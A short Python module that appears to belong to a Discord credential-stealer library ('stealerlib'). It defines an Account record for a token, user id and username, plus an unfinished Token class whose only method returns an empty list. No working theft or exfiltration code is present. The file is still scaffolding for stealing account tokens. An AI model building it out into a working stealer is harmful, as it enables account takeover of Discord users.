# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/discord/accounts.py
"""

from stealerlib.discord import *


@dataclass
class Account:
    """Discord Account dataclass
    
    Note:
        This dataclass isn't currently implemented
    """

    token: str
    userid: str
    username: str
    discriminator: str

    def __repr__(self) -> str:
        return self.token


class Token:
    """Discord Token related functions (get information and return an Account object)

    Note:
        Unfinished and not used as a sub-class to the Discord package yet
    """

    def __init__(self):
        pass

    def get_token_information(self) -> list:

        return []


# @dataclass
# class Account:
#     """Discord Account dataclass
    
#     Note:
#         This dataclass isn't currently implemented
#     """

#     _token: str
#     userid: str
#     username: str
#     discriminator: str

#     @property
#     def token(self) -> str:
#         return self._token

#     @property.setter
#     def token(self, new_token):
#         check_token = lambda token: True # placeholder

#         if check_token(new_token):
#             self._token = new_token

#     def __repr__(self) -> str:
#         return self.token
